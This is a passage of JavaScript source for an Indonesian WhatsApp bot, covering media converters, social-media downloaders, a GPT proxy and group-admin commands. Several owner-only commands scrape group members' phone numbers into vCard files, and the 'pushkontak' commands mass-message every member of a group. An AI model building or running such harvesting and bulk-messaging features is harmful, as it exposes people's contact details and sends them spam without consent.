* Claim Garansi Wajib Bawa Bukti Transaksi!

*Ready Juga Resseller Panel ✅*
* *Harga :* Rp10.000/Bulan
* Create Panel Lewat Bot

Minat ? Hubungi Ownerbot Dengan Cara Ketik *.owner*
`
inzie.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case "list_scbot": {

let teks = `Belum Tersedia`
inzie.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case 'hd':
  case 'remini':{
if (!quoted) return replynano(`GAMBARNYA MANA WOI`)
			if (!/image/.test(mime)) return replynano(`Kirim/Balas Foto Dengan caption ${prefix + command}`)
			reply(mess.wait)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			inzie.sendMessage(m.chat, { image: proses, caption: `DONE ${command}_`}, { quoted: m})
			} catch {
			  reply('yah eror kak')
			}
			}
			break
case "chatgpt": case "gpt": {

if (!text) return m.reply(example("apa itu nodejs"))
m.reply(msg.wait)
await fetchJson(`https://aemt.me/gpt4?text=${text}`).then((e) => {
if (!e.status) return m.reply(JSON.stringify(e, null, 2))
var teks = `*© GPT - Chat Version 0.4*\n\n${e.result}`
m.reply(teks)
})
}
break
case "ai": case "openai": {

if (!text) return m.reply(example("kamu siapa"))
m.reply(msg.wait)
await fetchJson(`https://aemt.me/openai?text=${text}`).then((e) => {
if (!e.status) return m.reply(JSON.stringify(e, null, 2))
var teks = `*© AI - Asistent New Latest*\n\n${e.result}`
m.reply(teks)
})
}
break
case "toptv": {

if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
inzie.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return m.reply(example("dengam mengirim/balas vidio"))
}
}
break
case "toimage": {

if (!/webp/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan reply sticker'))
m.reply(msg.wait)
let media = await inzie.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
inzie.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "tovn": case "toptt": {

if (!/video|audio/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim audio/vidio'))
m.reply(msg.wait)
await inzie.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
inzie.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case "toaudio": case "tomp3": {

if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim vidio'))
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik")
m.reply(msg.wait)
await inzie.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
inzie.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
case "sticker": case "stiker": case "sgif": case "s": {

if (!/image|video/.test(mime)) return m.reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
m.reply(msg.wait)
var media = await inzie.downloadAndSaveMediaMessage(qmsg)
await inzie.sendStimg(m.chat, media, m, {packname: global.packname})
await fs.unlinkSync(media)
}
break
case 'tourl': {
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) reply ('Tidak ada media yang ditemukan')
  let media = await q.download()
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let fileSizeLimit = 5 * 1024 * 1024 
  if (media.length > fileSizeLimit) {
    reply ('Ukuran media tidak boleh melebihi 5MB')
  }
  let link = await (isTele ? uploadImage : uploadFile)(media)
  InzieReply(`\`Linknya :\`\n${link}`)
}
break
case "public": {

if (!isOwner) return inzieReply(msg.owner)
inzie.public = true
m.reply("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {

if (!isOwner) return inzieReply(msg.owner)
inzie.public = false
m.reply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case "get": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply("linknya")
try {
var check = await fetchJson(text)
m.reply(JSON.stringify(check, null, 2))
} catch (e) {
return m.reply(e.toString())
}}
break
case "setteksjpm": {

if (!isOwner) return inzieReply(msg.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./all/all/database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {

if (!isOwner) return inzieReply(msg.owner)
m.reply(fs.readFileSync("./all/all/database/teksjpm.js").toString())
}
break
case "instagram": case "igdl": case "ig": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("instagram.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await api.igdl(`${text}`).then((res) => {
for (let a of res.result) {
inzie.sendMedia(m.chat, a.url, m, {
caption: "Instagram Downloader Done ✅"})
}
}).catch(e => m.reply(e.toString()))
}
break
case "tiktokaudio": case "tiktokmp3": case "ttaudio": case "ttmp3": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokdl?url=${text}`).then((res) => {
inzie.sendMessage(m.chat, {audio: {url: res.result.music}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "tiktokslide": case "ttslide": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`).then(async (data) => {
if (!data.status) return m.reply(JSON.stringify(data, null, 2))
if (data.result.totalSlide == 0) return m.reply("Link Tiktok Bukan Slide!")
var cap = `*Tiktok Downloader Done ✅*`
for (let i of data.result.images) {
inzie.sendMessage(m.chat, {image: {url: `${i}`}, caption: cap}, {quoted: m})
}
}).catch(e => m.reply(e.toString()))
}
break
case "mediafire": {

if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await api.mediafireDl(text).then((res) => {
if (res.filesize.includes("GB")) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.filesize.split("MB")[0] >= 100) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.url == "") return m.reply(mess.error)
inzie.sendMessage(m.chat, {document: {url: res.url}, fileName: res.filename, mimetype: "application/"+res.ext.toLowerCase(), caption: "Download Berhasil ✅"}, {quoted: m})
}).catch((e) => m.reply(e.toString()))
}
break
case 'pinterest':
case 'pin':{
if(!text)return m.reply("Mana text nya?")
const {GOOGLE_IMG_SCRAP} = require('google-img-scrap');
let cariimg = await GOOGLE_IMG_SCRAP({search: text,limit: 6,domains: ["pinterest.com"]})
let imgs = cariimg.result
let imgres = cariimg.result.length
if(imgres==0)return m.reply("Hasil tidak di temukan")
let lim = () => {
  if(imgres>5){return 5}else{return imgres} }
let lmt = lim()
let arrcard = []
for(let i=0;i<lmt;i++){
let eek = {
"header": proto.Message.InteractiveMessage.Header.create({...(await prepareWAMessageMedia({ image : await getBuffer(imgs[i].url)}, { upload: inzie.waUploadToServer})),
title: `*[PINTEREST SEARCH]*`,
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
"body": {
"text": `Hasil ${i+1} pinterest`
},
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Link","url":"${imgs[i].url}","merchant_url":"https://www.google.co.id"}`
}
]
})
   }
    arrcard.push(eek)
    await sleep(2000)
  }

let ctamsg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body:{text:"*Berikut Hasil Pencarian Anda*"},
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
        "cards": arrcard,
        "messageVersion": 1
       }
    )
})
}
}
}, {});
await inzie.relayMessage(ctamsg.key.remoteJid, ctamsg.message, {
messageId: ctamsg.key.id
})

}
break

case "tiktok": case "tt": {

if (!text) return m.reply(example('linknya'))
if (!/tiktok.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
 let anuan = text
await api.tiktok(anuan).then(async (res) => {
var cap = `*Tiktok Downloader Done ✅*`
if (res.result.duration == 0) {
for (let a of res.result.images) {
inzie.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await inzie.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => m.reply(e.toString))
}
break
case "facebook": case "fb": case "fbdl": {

if (!text) return m.reply(example("linkvidionya"))
if (!/facebook.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return m.reply(JSON.stringify(res, null, 2))
inzie.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `*Facebook Downloader Done ✅*`}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "owner": {
inzie.sendContact(m.chat, [owner], "Developer Bot WhatsApp", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/owner.jpg"), 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: global.linkyt, 
mediaType: 1
}}})
}
break

case "antilink": {
if (!isGroup) return inzieReply(msg.group)
if (!isOwner && !isAdmin) return inzieReply(msg.admin)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Menyalakan *Antilink* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return m.reply(example("on/off"))
}}
break

case "antilinkV2": case "antilinkv2": {
if (!isGroup) return inzieReply(msg.group)
if (!isOwner && !isAdmin) return inzieReply(msg.owner)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Inii")
} else {
return m.reply(example("on/off"))
}}
break

case "welcome": {
if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return m.reply("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
m.reply("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return m.reply("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
m.reply("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "autoread": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return m.reply("*Autoread* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = true
m.reply("Berhasil Menyalakan *Autoread ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return m.reply("*Autoread* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = false
m.reply("Berhasil Mematikan *Autoread ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break

case "anticall": {
if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (anticall) return m.reply("*Anticall* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = true
m.reply("Berhasil Menyalakan *Anticall ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return m.reply("*Anticall* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = false
m.reply("Berhasil Mematikan *Anticall ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break

case "setting": case "settingbot": case "option": case "statusbot": {
if (!isOwner) return inzieReply(msg.owner)
var teks = `
*List Status Bot Settings :*

* Autoread : ${global.autoread ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Anticall : ${global.anticall ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Welcome : ${global.welcome ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
m.reply(teks)
}
break
case "statusgc": {

if (!isGroup) return inzieReply(msg.group)
if (!isOwner && !isAdmin) return inzieReply(msg.admin)
var anti1 = "Aktif ✅"
var anti2 = "Aktif ✅"
if (!antilink2.includes(m.chat)) anti2 = "Tidak Aktif ❌"
if (!antilink.includes(m.chat)) anti1 = "Tidak Aktif ❌"
var teks = `
*List Status Grup Settings :*

* Antilink : *${anti1}*
* AntilinkV2 : *${anti2}*

*Contoh Penggunaan :*
Ketik *.antilink* on/off
`
inzie.senText(m.chat, teks, qchanel)
}
break
case "setppgc": {

if (!isGroup) return inzieReply(msg.group)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (/image/g.test(mime)) {
let media = await inzie.downloadAndSaveMediaMessage(qmsg)
await inzie.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti *Profil* Grup")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setnamegc": case "setnamagc": {

if (!isGroup) return inzieReply(msg.group)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (!text) return m.reply(example('teksnya'))
const gcname = metadata.subject
await inzie.groupUpdateSubject(m.chat, text)
m.reply(`Berhasil Mengganti Nama Grup *${gcname}* Menjadi *${text}*`)
}
break
case "setdesc": case "setdesk": {

if (!isGroup) return inzieReply(msg.group)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (!text) return m.reply(example('teksnya'))
await inzie.groupUpdateDescription(m.chat, text)
m.reply(`Berhasil Mengganti *Deskripsi* Grup`)
}
break
case "open": {

if (!isGroup) return inzieReply(msg.group)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
await inzie.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {

if (!isGroup) return inzieReply(msg.group)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
await inzie.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {

if (isGroup) {
if (!isOwner && !isAdmin) return inzieReply(msg.admin)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
inzie.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return inzieReply(msg.adminbot)
inzie.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return inzieReply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
inzie.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {

if (!isGroup) return inzieReply(msg.group)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await inzie.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "promote": case "promot": {

if (!isGroup) return inzieReply(msg.group)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await inzie.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "add": case "addmember": {

if (!isGroup) return inzieReply(msg.group)
if (!args[0]) return m.reply(example("62838XXX"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await inzie.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return m.reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return m.reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
var a = await inzie.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return m.reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return m.reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case "kik": case "kick": {

if (!isGroup) return inzieReply(msg.group)
if (!isBotAdmin) return inzieReply(msg.adminbot)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await inzie.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => inzie.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {

if (!isGroup) return inzieReply(msg.group)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
inzie.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "tagall": case "tag": {

if (!isGroup) return inzieReply(msg.group)
if (!isAdmin && !isOwner) return inzieReply(msg.admin)
if (!text) return m.reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
inzie.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "owner": case "creator": {

inzie.sendContact(m.chat, [`${owner[0].split("@")[0]}`], "Developer Bot", m)
}
break
case "savekontak": {

if (!isOwner) return inzieReply(msg.owner)
if (!isGroup) return inzieReply(msg.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await inzie.sendMessage(m.sender, { document: fs.readFileSync("./all/all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/all/database/contacts.vcf", "")
}}
break
case "savekontak2": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await inzie.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await inzie.sendMessage(m.sender, { document: fs.readFileSync("./all/all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/all/database/contacts.vcf", "")
}}
break
case "pushkontak": {

if (!isOwner) return inzieReply(msg.owner)
if (!isGroup) return inzieReply(msg.group)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/all/database/contacts.json', JSON.stringify(contacts))
await inzie.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await inzie.sendMessage(m.sender, { document: fs.readFileSync("./all/all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await inzie.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/all/database/contacts.json', JSON.stringify(contacts))
await inzie.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await inzie.sendMessage(m.sender, { document: fs.readFileSync("./all/all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/all/database/contacts.vcf", "")
}}
break
case "pushkontak2": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
